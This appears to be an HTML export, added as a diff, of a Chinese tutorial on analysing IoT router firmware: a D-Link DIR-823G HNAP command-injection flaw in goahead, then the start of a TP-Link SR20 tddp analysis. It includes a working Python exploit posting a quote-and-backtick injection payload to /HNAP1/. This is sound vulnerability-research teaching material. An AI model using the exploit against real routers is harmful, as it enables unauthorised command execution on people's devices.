@@ -1,0 +1,381 @@
+<html>
+<head>
+<META http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+<meta content="text/css" http-equiv="Content-Style-Type">
+<title>物联网-动静态分析IOT堆栈溢出和命令执行等常见漏洞2</title>
+</head>
+<body>
+<h1 align="center" class="root">
+<a name="40k9f8ddicr34h7d6jsrck4na5">物联网-动静态分析IOT堆栈溢出和命令执行等常见漏洞2</a>
+</h1>
+<div align="center" class="globalOverview">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/images/%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2.jpg"></div>
+<h2 class="topic">
+<a name="1kbtbus61mfi2tatt8i63vd9o0">DIR-823G命令执行</a>
+</h2>
+<h3 class="topic">
+<a name="47fji54sglggr43qlrpok1isv9">&nbsp;漏洞分析</a>
+</h3>
+<h3 class="topic">
+<a name="50kg6su5aosfl4r1uqfri6kk35">&nbsp;&nbsp;使用binwalk解压存在漏洞的固件</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/0orrn35m516o2huuasij92pg79.png"></p>
+<h3 class="topic">
+<a name="3dcpmpjep4ndmnrfg5e2d19mhr">&nbsp;&nbsp;&nbsp;进入固件文件系统</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/5jp6ssoff7q93qk2lmc5a3n0rl.png"></p>
+<h3 class="topic">
+<a name="4ajs747rd85d0bun1n12m4sojt">&nbsp;&nbsp;&nbsp;&nbsp;查看固件架构</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/661n77afuqrr7f7v7ig3a7saj5.png"></p>
+<h3 class="topic">
+<a name="2ia4h4t8ltv2e1n2l2s2udfkmc">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;查看etc/init.d目录的rcS，其中保存系统运行时的自启动项</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/2he6hn3k8551hn9mu5j607ijc4.png"></p>
+<h3 class="topic">
+<a name="45g015qqc5j0gq1eneu8h695f6">&nbsp;&nbsp;根据rcS中信息，固件会自启动goahead（开源web服务器）</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/7k23emveu323retebvq1sck85j.png"></p>
+<h3 class="topic">
+<a name="68nngkjosaidndtakbbdji0ccp">&nbsp;&nbsp;&nbsp;根目录下查找goahead，发现bin目录下有</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/3mtuc3g6e38eou6u2nnp8lgmea.png"></p>
+<h3 class="topic">
+<a name="137qpn8hhfb9nmkr6ohr6069g2">&nbsp;&nbsp;&nbsp;&nbsp;下载goahead源码goahead-5.1.1</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/222roqvmmus5mhm6l53i9kmmln.png"></p>
+<h3 class="topic">
+<a name="41gf6vvn38t6i5t0jfob0v5roa">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goahead自定义了对url的处理流程，主要位于src目录下</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/758l8augi44g5209c3csttidr1.png"></p>
+<h3 class="topic">
+<a name="1jik4o50mhr0ftc39achnb2mvl">&nbsp;&nbsp;查看route.c文件 nvim route.c。搜索webUrlHandlerDefine函数，该函数允许用户自定义url并指定函数，漏洞就出现于该函数</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/4i6puaaq79lgss26s830tdqm5e.png"></p>
+<h3 class="topic">
+<a name="3dp1g0ma85lg7n82lcb0mqd5u1">&nbsp;&nbsp;&nbsp;将bin/goahead拷贝到ida中分析。找到漏洞点，当处理hnap请求时，处理函数处理不当，从而导致漏洞，搜索HNAP字符串，通过x定位到图中指令处，其中处理函数sub_42383c为关键函数</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/4ud1rmheajvvsp7vk9nrpk9gbh.png"></p>
+<h3 class="topic">
+<a name="68315jemagg7ndp6kbcc6mpair">&nbsp;&nbsp;&nbsp;&nbsp;sub_42383c中会引用一张函数表，该函数表中函数用于处理goahead收到的不同请求，该请求往往是通过url传递的</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/03gme2csterf4mnoct4f0kijou.png"></p>
+<h3 class="topic">
+<a name="5u21g6tadeetcjipb5hd8jaee9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;该函数继续分析，发现会进行echo输出，此处触发命令执行漏洞</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/719mausapheofub3u5spnnmtet.png"></p>
+<h3 class="topic">
+<a name="1i8bu6ci0pcqbrdvrfgjnvrho3">&nbsp;&nbsp;启动ghidra，查看goahead中mips反编译的c代码</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/7p3o7tghumohfe0gftdav9keoe.png"></p>
+<h3 class="topic">
+<a name="759rmmktp5nqk0crb05g98tne6">&nbsp;&nbsp;&nbsp;启动goahead</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/1gvp7731b1bmv00o4ro7hk7420.png"></p>
+<h3 class="topic">
+<a name="02g5jec3fjmdudra5htackpdas">&nbsp;&nbsp;&nbsp;&nbsp;查找hnap字符串</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/0i7g3rgslmjkf2mm1k8836idbo.png"></p>
+<h3 class="topic">
+<a name="4juevklsja0m8nah51b2au2q2v">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;输入字符串，选择所有模块并搜索所有</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/2dkg88tt3u33a0p0jkqr1ppkf1.png"></p>
+<h3 class="topic">
+<a name="099f15r96dvb90k4rjtj7qhern">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/1h7rkkpg91g35p84t2jimips1b.png"></p>
+<h3 class="topic">
+<a name="5ovm0a9dchf88ltpmdgcvv9sat">&nbsp;&nbsp;搜索到的字符串，查找引用该字符串的函数</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/1njkddbp88h8t769dpcv30nuj4.png"></p>
+<h3 class="topic">
+<a name="2o5g2reiki9aojcmq3i6b1snm4">&nbsp;&nbsp;&nbsp;引用该字符串的函数</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/3no7kjgg1ogh3a7hqjq04oqscm.png"></p>
+<h3 class="topic">
+<a name="45195v17kdr2etldakc6qmr3au">&nbsp;&nbsp;&nbsp;&nbsp;函数触发漏洞的是snprintf，该函数将字符串格式化，将url中的参数param_7写入到%s的位置，并作为echo指令的一部分执行，如果param_7中存在单引号，就看可以闭合'%s\'，从而任意命令执行，要修复该漏洞，需要对param_7进行过滤</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/1gh3pem1hkiujds9egvnguruik.png"></p>
+<h3 class="topic">
+<a name="20qt9hovfj4eh9jjk6ccqcafnb">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bash中会优先执行反引号中的指令，`echo ls`即表示会执行ls指令，最终构造payload时，需要使用单引号''将原始的单引号闭合，单引号中使用反引号``指定要执行的指令，类似于'`echo ls`'</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/24li836f9ntp627f361enr1up3.png"></p>
+<h3 class="topic">
+<a name="0l14kqrn4hge2fd4ku3q5cif9f">&nbsp;构造exp</a>
+</h3>
+<h3 class="topic">
+<a name="4v2k4te6a561ud8n760o2k48r6">&nbsp;&nbsp;exp</a>
+</h3>
+<h3 class="topic">
+<a name="2f24fdf4d0acds572q26vgeu33">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/2nmgh9cimka09hie6os74o9shm.png"></p>
+<h3 class="topic">
+<a name="7mvtrkt44ia6nipgp2age4dgqe">&nbsp;&nbsp;&nbsp;&nbsp;#!/usr/bin/env python&#13;
+#-*- coding:utf-8 -*-&#13;
+ &#13;
+import requests&#13;
+ &#13;
+ &#13;
+IP='192.168.0.1'&#13;
+ &#13;
+#出入要执行的命令&#13;
+command = "'`echo 0431lab &gt; /web_mtn/test.txt`'"&#13;
+length = len(command)&#13;
+ &#13;
+#构造报文的头部&#13;
+headers = requests.utils.default_headers()&#13;
+headers["Content-Length"]=str(length)&#13;
+headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36"&#13;
+headers["SOAPAction"] = '"http://purenetworks.com/HNAP1/GetClientInfo"'&#13;
+headers["Content-Type"] = "text/xml; charset=UTF-8"&#13;
+headers["Accept"]="*/*"&#13;
+headers["Accept-Encoding"]="gzip, deflate"&#13;
+headers["Accept-Language"]="zh-CN,zh;q=0.9,en;q=0.8"&#13;
+ &#13;
+#发送攻击payload&#13;
+payload = command&#13;
+r = requests.post('http://'+IP+'/HNAP1/', headers=headers, data=payload)</a>
+</h3>
+<h3 class="topic">
+<a name="35im52c1f7lhnt232qlb6flafg">&nbsp;&nbsp;使用firmadyne模拟运行漏洞固件，将固件拷贝到firmadyne目录下，根据example_test.sh中的指令执行固件模拟</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/7n2ruffvfavf41unhuj1ur5vgn.png"></p>
+<h3 class="topic">
+<a name="3ruuf5427bqi6ngsgid0b0ur2a">&nbsp;&nbsp;&nbsp;固件镜像启动完毕（此时将整个固件系统均模拟启动，而不是仅启动goahead），可以web访问</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/74bdak5juhjakciqqmomqlrbg7.png"></p>
+<h3 class="topic">
+<a name="1buf4io8vcat9h0hs75fhcktml">&nbsp;&nbsp;&nbsp;&nbsp;配置固件的网络设置，使其完全启动</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/3kt01jkkqqf3tht5e2ls32dkbu.png"></p>
+<h3 class="topic">
+<a name="3fad2offe2l4bpsuv60ceugnch">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;python exp.py，执行exp，访问指定url发现数据被成功写入，说明payload被成功执行</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/01pequ19opdfe5agm2iil73689.png"></p>
+<h2 class="topic">
+<a name="4te6l475efjcim5u7ofp66v41j">TP-SR20命令执行漏洞</a>
+</h2>
+<h3 class="topic">
+<a name="45tieidpkn2fvc6onm28hs20fq">&nbsp;漏洞分析</a>
+</h3>
+<h3 class="topic">
+<a name="579lvfpol2lnhedusv53k99iuc">&nbsp;&nbsp;binwalk提取固件文件系统</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/01qjh1fbtdq9nf4uj389r79s2i.png"></p>
+<h3 class="topic">
+<a name="189ppgbda5dqbomb11c5fb8oqt">&nbsp;&nbsp;&nbsp;查看文件系统及其架构，查看的是tddp程序，该程序造成了远程代码执行，tddp是设备厂商的的私有协议，有其特定的报文格式，也会使用tcp和udp进行编写，tddp使用udp进行编写</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/335ihgusiofkd0gftcj2spc41i.png"></p>
+<h3 class="topic">
+<a name="0m9hjnt9ghojf8kaa7bp0mgag7">&nbsp;&nbsp;&nbsp;&nbsp;报文格式中我们关注version：指定了tddp服务及其版本，用于客户端指定使用tddp服务，使服务端识别；server：指定客户端要运行的特定tddp服务，从而运行带漏洞的服务</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/1i6rs4ria5ogla08nmhrsir6n9.png"></p>
+<h3 class="topic">
+<a name="3ttaipi06cfiqq5cnnvp3rlgvj">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建虚拟网络接口</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/1a0vml4dedlk2c8s2ho7qhbofq.png"></p>
+<h3 class="topic">
+<a name="6cv3mklod1vevckau5ge3iscah">&nbsp;&nbsp;设置网络接口的ip</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/6k6hf29u1clgjkkngtj7tbfgkh.png"></p>
+<h3 class="topic">
+<a name="5mdej310hdook4bk8mdkte1vc8">&nbsp;&nbsp;&nbsp;启动固件对应架构的虚拟环境</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/6hfn6tnt0felps9has9553m5jc.png"></p>
+<h3 class="topic">
+<a name="4ostm9628qrg8ckdld6892un2u">&nbsp;&nbsp;&nbsp;&nbsp;本机中启动http服务</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/3h92k5dldhrchto514gqbe4ran.png"></p>
+<h3 class="topic">
+<a name="476vf4s16s8605thm8jrnt3ros">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模拟环境中设置ip地址使用wge从本机中获得固件</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/2sfljp8lsnv8hc8jrsobeoop82.png"></p>
+<h3 class="topic">
+<a name="1f4qgevm29b3ur0ehhjoan6jvr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为固件文件系统中部分目录缺失，所以需要将虚拟环境中的目录挂载到固件文件系统对应目录中，运行不同的固件程序，要挂载的目录可能不一样</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/3bknm0rp2g2inu52g25mstr4ak.png"></p>
+<h3 class="topic">
+<a name="3uui0u4jpfvqcodgf7heo17heg">&nbsp;&nbsp;运行固件，固件系统中输入tddp指令，显示tddp服务开始运行</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/72u45dl53tmqq9k7e72jsr8aka.png"></p>
+<h3 class="topic">
+<a name="4noqhkjuc8vl8qfderpg7594qf">&nbsp;&nbsp;&nbsp;ida打开tddp可执行程序，搜索recvfrom函数</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/1c1djagj6d7m4kvr5h4dc366um.png"></p>
+<h3 class="topic">
+<a name="34h515usb5bbtavu7ojgp9f2ct">&nbsp;&nbsp;&nbsp;&nbsp;查找recvfrom上层函数，发现sub_936c中存在字符串tddp task start字符串，该函数即TDDP_START函数</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/55emj42h5ltuphfoss1l2pq4bv.png"></p>
+<h3 class="topic">
+<a name="4lfu03o40s5tmt9785n0s8qotv">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TDDP_START函数中会调用sub_16418,后者会调用recv_from函数</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/4135get09av58krhe77o0et6k4.png"></p>
+<h3 class="topic">
+<a name="3lqdaifju8frf4envbmf2sb507">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub_16418函数中涉及tddp版本的判断，且sub_15e74疑似关键函数</a>
+</h3>
+<p class="topicImage">
+<img src="%E7%89%A9%E8%81%94%E7%BD%91-%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90IOT%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E2_files/6eajeileqcnhc8jefp3ucfl4d5.png"></p>
+<h3 class="topic">
